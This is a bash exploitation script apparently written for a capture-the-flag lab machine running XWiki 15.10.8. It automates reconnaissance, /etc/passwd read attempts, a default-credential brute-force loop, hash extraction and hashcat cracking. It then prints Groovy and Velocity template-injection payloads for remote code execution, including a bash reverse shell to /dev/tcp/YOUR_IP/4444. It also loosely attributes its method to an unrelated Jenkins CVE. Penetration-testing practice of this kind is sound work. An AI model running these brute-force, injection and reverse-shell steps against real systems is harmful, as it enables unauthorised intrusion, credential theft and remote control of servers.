#!/bin/bash
# SYSTEM 1: EDITOR - Enhanced XWiki Exploitation Script
# Based on CVE-2024-23897 methodology (file read -> hash extraction -> RCE)
# Target: XWiki 15.10.8 on port 8080

S1_IP="10.129.7.80"
S1_NAME="editor.htb"
OUTPUT_DIR="$HOME/Downloads/system1_exploit_enhanced_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 1: EDITOR - Enhanced XWiki Exploitation"
echo "Based on Jenkins CVE-2024-23897 Methodology"
echo "=========================================="
echo "Target: $S1_IP"
echo "XWiki: http://$S1_IP:8080/xwiki"
echo ""

# ============================================
# PHASE 1: XWiki Status & Version Check
# ============================================
echo "[*] Phase 1: XWiki Status & Version Check"
echo ""

# Check if XWiki is initialized
echo "[+] Checking XWiki initialization status..."
curl -s http://$S1_IP:8080/xwiki/ > 01_xwiki_status.html
if grep -qi "initializing" 01_xwiki_status.html; then
    PERCENT=$(grep -oP 'initializing \(\K[0-9]+' 01_xwiki_status.html | head -1)
    echo "[!] XWiki is still initializing ($PERCENT%)"
    echo "PERCENT=$PERCENT" > init_status.txt
else
    echo "[+] XWiki appears to be initialized"
fi

# Check REST API for version
echo ""
echo "[+] Checking XWiki version via REST API..."
curl -s http://$S1_IP:8080/xwiki/rest/ > 02_xwiki_rest.txt
VERSION=$(grep -oP '<version>\K[^<]+' 02_xwiki_rest.txt | head -1)
echo "Version: $VERSION"
echo "$VERSION" > xwiki_version.txt

# ============================================
# PHASE 2: File Read Attempts (Like CVE-2024-23897)
# ============================================
echo ""
echo "[*] Phase 2: File Read Attempts"
echo ""

echo "[+] Attempting to read system files via XWiki REST API..."
echo "Note: XWiki may have different file read vectors than Jenkins"

# Try to read /etc/passwd via various methods
echo "[+] Trying to read /etc/passwd..."
curl -s "http://$S1_IP:8080/xwiki/bin/view/Main/WebHome?xpage=plain&content=/etc/passwd" > 03_file_read_passwd.txt 2>&1
curl -s "http://$S1_IP:8080/xwiki/bin/view/etc/passwd" > 04_file_read_passwd2.txt 2>&1

# Check if we got any file content
if grep -qi "root:" 03_file_read_passwd.txt 2>/dev/null || grep -qi "root:" 04_file_read_passwd2.txt 2>/dev/null; then
    echo "[!] Possible file read success!"
    cat 03_file_read_passwd.txt 04_file_read_passwd2.txt | grep -E "^[a-z]" | head -5
fi

# ============================================
# PHASE 3: Authentication & Credential Discovery
# ============================================
echo ""
echo "[*] Phase 3: Authentication & Credential Discovery"
echo ""

# Try default credentials
echo "[+] Trying default credentials..."
for user in admin Admin xwiki XWiki administrator Administrator Admin; do
    for pass in admin Admin xwiki XWiki password Password123 admin123; do
        echo -n "Trying: $user:$pass ... "
        
        # Get login page and extract CSRF token if present
        curl -s -c cookies_temp.txt http://$S1_IP:8080/xwiki/bin/login/XWiki/XWikiLogin > login_page.html
        
        # Try login
        RESPONSE=$(curl -s -X POST http://$S1_IP:8080/xwiki/bin/login/XWiki/XWikiLogin \
            -d "j_username=$user&j_password=$pass" \
            -L -c cookies_${user}_${pass}.txt \
            -o login_${user}_${pass}.html 2>&1)
        
        # Check if login was successful
        if grep -qi "logout\|Dashboard\|Welcome" login_${user}_${pass}.html 2>/dev/null; then
            echo "SUCCESS!"
            echo "$user:$pass" > CREDENTIALS_FOUND.txt
            echo "CREDENTIALS: $user:$pass" >> CREDENTIALS_FOUND.txt
            break 2
        else
            echo "failed"
        fi
    done
done

# ============================================
# PHASE 4: Hash Extraction (If Authenticated)
# ============================================
echo ""
echo "[*] Phase 4: Hash Extraction Attempts"
echo ""

if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials found! Attempting to extract password hashes..."
    
    CREDS=$(grep "^CREDENTIALS:" CREDENTIALS_FOUND.txt | cut -d: -f2- | tr -d ' ')
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    # Login and get session
    curl -s -X POST http://$S1_IP:8080/xwiki/bin/login/XWiki/XWikiLogin \
        -d "j_username=$USER&j_password=$PASS" \
        -L -c session_cookies.txt > /dev/null
    
    echo "[+] Attempting to access user configuration files..."
    echo "[+] XWiki stores user data in database or filesystem"
    echo "[+] Try accessing: /xwiki/bin/view/XWiki/$USER"
    
    # Try to access user profile/configuration
    curl -s -b session_cookies.txt "http://$S1_IP:8080/xwiki/bin/view/XWiki/$USER" > 05_user_profile.html
    
    # Look for password hashes in source
    if grep -i "password\|hash\|bcrypt\|sha" 05_user_profile.html 2>/dev/null; then
        echo "[!] Possible password hash found in user profile!"
        grep -i "password\|hash\|bcrypt\|sha" 05_user_profile.html > 06_possible_hashes.txt
    fi
    
else
    echo "[-] No credentials found. Cannot extract hashes without authentication."
fi

# ============================================
# PHASE 5: Hash Cracking (If Hash Found)
# ============================================
echo ""
echo "[*] Phase 5: Hash Cracking"
echo ""

if [ -f 06_possible_hashes.txt ]; then
    echo "[+] Hash found! Attempting to crack..."
    
    # Extract hash
    HASH=$(grep -oP 'hash[^<]*' 06_possible_hashes.txt | head -1)
    echo "$HASH" > hash_to_crack.txt
    
    echo "[+] Hash format detection..."
    if echo "$HASH" | grep -qi "bcrypt\|\\$2a\\$"; then
        echo "[+] Detected: bcrypt hash"
        echo "[+] Cracking with hashcat..."
        echo "Command: hashcat -m 3200 hash_to_crack.txt /usr/share/wordlists/rockyou.txt"
        hashcat -m 3200 hash_to_crack.txt /usr/share/wordlists/rockyou.txt --show 2>/dev/null | head -5 > 07_cracked_hash.txt
    elif echo "$HASH" | grep -qi "sha256\|sha512"; then
        echo "[+] Detected: SHA hash"
        echo "[+] Cracking with hashcat..."
        hashcat -m 1400 hash_to_crack.txt /usr/share/wordlists/rockyou.txt --show 2>/dev/null | head -5 > 07_cracked_hash.txt
    fi
    
    if [ -f 07_cracked_hash.txt ] && [ -s 07_cracked_hash.txt ]; then
        echo "[!] Hash cracked!"
        cat 07_cracked_hash.txt
    fi
fi

# ============================================
# PHASE 6: Template Injection RCE
# ============================================
echo ""
echo "[*] Phase 6: Template Injection RCE"
echo ""

if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials available! Attempting template injection..."
    
    CREDS=$(grep "^CREDENTIALS:" CREDENTIALS_FOUND.txt | cut -d: -f2- | tr -d ' ')
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    echo ""
    echo "=========================================="
    echo "MANUAL TEMPLATE INJECTION STEPS"
    echo "=========================================="
    echo ""
    echo "1. Login to XWiki: http://$S1_IP:8080/xwiki"
    echo "   Username: $USER"
    echo "   Password: $PASS"
    echo ""
    echo "2. Create a new page or edit existing page"
    echo ""
    echo "3. Try Groovy template injection:"
    echo "   {{groovy}}"
    echo "   def proc = 'whoami'.execute()"
    echo "   proc.waitFor()"
    echo "   println proc.text"
    echo "   {{/groovy}}"
    echo ""
    echo "4. For reverse shell (set up listener first: nc -lvp 4444):"
    echo "   {{groovy}}"
    echo "   def proc = 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'.execute()"
    echo "   proc.waitFor()"
    echo "   {{/groovy}}"
    echo ""
    echo "5. Alternative: Velocity template injection:"
    echo "   #set(\$exec = \$xwiki.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami'))"
    echo "   #set(\$is = \$exec.getInputStream())"
    echo "   #foreach(\$i in [1..\$is.available()])"
    echo "   \$is.read()"
    echo "   #end"
    echo ""
    
else
    echo "[-] No credentials. Template injection requires authentication."
fi

# ============================================
# PHASE 7: Script Console Access (Like Jenkins)
# ============================================
echo ""
echo "[*] Phase 7: Script Console Access Attempts"
echo ""

if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Attempting to access XWiki Script Console..."
    
    CREDS=$(grep "^CREDENTIALS:" CREDENTIALS_FOUND.txt | cut -d: -f2- | tr -d ' ')
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    # Try to access script console
    curl -s -b session_cookies.txt "http://$S1_IP:8080/xwiki/bin/view/XWiki/GroovyShell" > 08_script_console.html
    curl -s -b session_cookies.txt "http://$S1_IP:8080/xwiki/bin/view/XWiki/AdminTools" > 09_admin_tools.html
    
    if grep -qi "groovy\|script\|console" 08_script_console.html 2>/dev/null; then
        echo "[!] Script console may be accessible!"
        echo "[+] Try accessing: http://$S1_IP:8080/xwiki/bin/view/XWiki/GroovyShell"
    fi
    
    echo ""
    echo "If script console is accessible, try:"
    echo "println('whoami'.execute().text)"
    echo "or"
    echo "'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'.execute()"
    echo ""
fi

# ============================================
# PHASE 8: Search for Exploits
# ============================================
echo ""
echo "[*] Phase 8: Exploit Research"
echo ""

echo "[+] Searching for XWiki exploits..."
searchsploit xwiki > 10_xwiki_exploits.txt 2>&1
cat 10_xwiki_exploits.txt | head -30

echo ""
echo "[+] Searching for XWiki 15.x specific exploits..."
searchsploit xwiki 15 > 11_xwiki_15_exploits.txt 2>&1
cat 11_xwiki_15_exploits.txt

# ============================================
# SUMMARY
# ============================================
echo ""
echo "=========================================="
echo "ENHANCED EXPLOITATION COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
echo ""
ls -lh "$OUTPUT_DIR" | head -20
echo ""
echo "Key Files:"
echo "- CREDENTIALS_FOUND.txt: Discovered credentials"
echo "- hash_to_crack.txt: Extracted password hash"
echo "- 07_cracked_hash.txt: Cracked password (if successful)"
echo "- 10_xwiki_exploits.txt: Available exploits"
echo ""
echo "Next Steps:"
echo "1. Review credentials (CREDENTIALS_FOUND.txt)"
echo "2. If hash found, crack it (hash_to_crack.txt)"
echo "3. Login and try template injection manually"
echo "4. Try script console if accessible"
echo "5. Research XWiki 15.10.8 specific CVEs"

